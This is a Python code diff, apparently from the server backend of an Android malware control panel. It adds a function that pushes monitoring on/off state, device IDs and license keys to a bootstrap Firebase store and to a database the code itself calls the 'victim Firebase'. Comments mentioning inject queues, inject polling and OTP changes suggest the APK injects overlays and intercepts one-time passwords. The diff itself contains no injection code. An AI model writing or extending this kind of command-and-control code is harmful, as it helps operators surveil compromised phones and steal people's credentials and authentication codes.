@@ -414,9 +414,45 @@ async def register_device_on_firebase(
     await _firebase_put(f"{base}/devices/{device.name}", payload)
 
 
+async def wake_apk_monitoring(profile: MonitorProfile, device: Device | None = None) -> None:
+    """APK uptime + inject poll — push config/{KEY} only (no inject queue / OTP changes)."""
+    license_key = get_license_key(profile)
+    if not license_key or not license_key.upper().startswith("KEY-"):
+        return
+
+    poll_id = resolve_apk_poll_id(profile, device)
+    firebase_url = resolve_apk_firebase_url(profile, device) or settings.apk_config_db.rstrip("/")
+    key = license_key.strip().upper()
+    payload = {
+        "monitoring": bool(profile.is_monitoring),
+        "ts": int(time.time() * 1000),
+        "firebase_url": normalize_firebase_url(firebase_url),
+        "device_id": poll_id,
+        "firebase_key": key,
+    }
+    bootstrap = settings.apk_config_db.rstrip("/")
+    bases: list[str] = []
+    if bootstrap:
+        bases.append(bootstrap)
+    victim = resolve_apk_firebase_url(profile, device)
+    if victim and victim not in bases:
+        bases.append(normalize_firebase_url(victim))
+
+    for base in bases:
+        ok = await _firebase_put_ok(f"{base}/config/{key}", payload)
+        logger.info(
+            "APK config wake monitoring=%s base=%s ok=%s poll_id=%s",
+            profile.is_monitoring,
+            base,
+            ok,
+            poll_id,
+        )
+
+
 async def publish_monitoring_state(profile: MonitorProfile, device: Device | None = None) -> None:
     """Push monitoring ON/OFF to APK config + victim Firebase immediately."""
     try:
+        await wake_apk_monitoring(profile, device)
         await push_virtus_apk_config(profile, device)
         await push_module_config(profile, device)
     except Exception as exc:
